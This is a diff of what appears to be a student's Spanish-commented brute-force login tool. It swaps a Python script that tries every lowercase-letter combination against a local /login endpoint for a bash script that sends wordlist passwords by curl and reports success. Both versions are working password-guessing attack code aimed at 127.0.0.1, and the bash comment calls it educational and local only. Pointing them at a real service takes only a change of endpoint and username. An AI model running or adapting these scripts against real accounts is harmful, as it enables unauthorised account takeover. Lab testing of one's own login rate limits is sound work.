@@ -1,87 +1,66 @@
-import requests
-import json
-import itertools
-import time
-import sys
-from requests.exceptions import ConnectionError, Timeout
+#!/usr/bin/env bash
+# brute.sh — fuerza bruta controlada con wordlist (solo local, educativo)
 
+API_ENDPOINT="http://127.0.0.1:8000/login"   # cambia si tu ruta no es /login
+TARGET_USERNAME="wilian"                      # cámbialo a "admin" u otro usuario si quieres
+WORDLIST_FILE="wordlist.txt"                  # archivo con una contraseña por línea
 
-URL = "http://127.0.0.1:8000/login"
-USERNAME = "leo" 
-ALPHABET = "abcdefghijklmnopqrstuvwxyz" 
-MAX_LENGTH = 11 
-SLEEP_TIME = 0.001 
-print(f"--- Iniciando Ataque de FUERZA BRUTA OPTIMIZADO contra {URL} ---")
-print(f"Usuario objetivo: {USERNAME}")
-print(f"Contraseña a buscar: 'abc' (Longitud {MAX_LENGTH})")
-print(f"Intentos por segundo (estimado): ~{1 / SLEEP_TIME}")
-print("-" * 50)
+PAUSE_SECONDS="0.1"    # pausa entre intentos
+ATTEMPT_LIMIT=""       # por ejemplo: 10000 (vacío = sin límite)
 
-def run_optimized_brute_force_attack():
-    session = requests.Session() 
-    
-    start_time = time.time()
-    intentos = 0
-    encontrado = False
+total_attempts=0
+start_time=$(date +%s)
 
-    for length in range(1, MAX_LENGTH + 1):
-        print(f"\n--- Probando contraseñas de longitud {length} ---")
-        
-        to_attempt = itertools.product(ALPHABET, repeat=length)
-        
-        for attempt_tuple in to_attempt:
-            password = "".join(attempt_tuple)
-            intentos += 1
-            
-            if intentos % 100 == 0 or intentos <= 10:
-                 print(f"Intento {intentos:,}: {password}")
+if [ ! -f "$WORDLIST_FILE" ]; then
+  echo "No existe: $WORDLIST_FILE"
+  exit 3
+fi
 
-            
-            payload = {
-                "nombre_usuario": USERNAME,
-                "contrasena": password
-            }
-            headers = {
-                "Content-Type": "application/json"
-            }
-            
-            try:
-        
-                time.sleep(SLEEP_TIME) 
-                
-                response = session.post(URL, headers=headers, data=json.dumps(payload), timeout=5)
+try_password() {
+  local password_guess="$1"
+  total_attempts=$((total_attempts + 1))
 
-            
-                if response.status_code == 200:
-                    encontrado = True
-                    break 
-                
-                
-                elif response.status_code != 401 and response.status_code != 422:
-                    print(f" Error inesperado del servidor ({response.status_code}) para la contraseña: {password}.")
+  # cortar si hay límite configurado
+  if [[ -n "$ATTEMPT_LIMIT" && "$total_attempts" -gt "$ATTEMPT_LIMIT" ]]; then
+    local end_time elapsed_seconds
+    end_time=$(date +%s)
+    elapsed_seconds=$((end_time - start_time))
+    echo "Se alcanzó ATTEMPT_LIMIT=$ATTEMPT_LIMIT"
+    echo "Intentos: $total_attempts"
+    echo "Tiempo: ${elapsed_seconds}s"
+    exit 2
+  fi
 
-            except ConnectionError:
-                print("\n ERROR DE CONEXIÓN: Asegúrate de que tu servidor Uvicorn esté corriendo.")
-                sys.exit(1)
-                
-            except Timeout:
-                print(f" TIEMPO DE ESPERA AGOTADO. El servidor no responde a tiempo. Saltando intento...")
-                time.sleep(1) 
-                
-        if encontrado:
-            break # Éxito
+  local request_body response
+  request_body=$(printf '{"username":"%s","password":"%s"}' "$TARGET_USERNAME" "$password_guess")
 
-    tiempo_total = time.time() - start_time
-    print("-" * 50)
-    
-    if encontrado:
-        print(f" ÉXITO! Contraseña encontrada: {password}")
-    else:
-        print(" FALLO! La contraseña no se encontró dentro del límite establecido.")
-        
-    print(f"Intentos totales: {intentos:,}")
-    print(f"Tiempo total: {tiempo_total:.4f} segundos")
-    return 0
+  response=$(curl -s -X POST "$API_ENDPOINT" \
+    -H "accept: application/json" \
+    -H "Content-Type: application/json" \
+    -d "$request_body")
 
-if __name__ == "__main__":
-    run_optimized_brute_force_attack()
+  echo "[#${total_attempts}] '$password_guess' -> $response"
+
+  if grep -q '"ok":[[:space:]]*true' <<<"$response" && grep -q 'login successful' <<<"$response"; then
+    local end_time elapsed_seconds
+    end_time=$(date +%s)
+    elapsed_seconds=$((end_time - start_time))
+    echo "Password encontrada: $password_guess"
+    echo "Intentos: $total_attempts"
+    echo "Tiempo: ${elapsed_seconds}s"
+    exit 0
+  fi
+
+  sleep "$PAUSE_SECONDS"
+}
+
+# Leer cada línea de wordlist.txt tal cual (una contraseña por línea)
+while read -r password_candidate; do
+  try_password "$password_candidate"
+done < "$WORDLIST_FILE"
+
+end_time=$(date +%s)
+echo "Password NO encontrada en la wordlist"
+echo "Intentos: $total_attempts"
+echo "Tiempo: $((end_time - start_time))s"
+exit 1
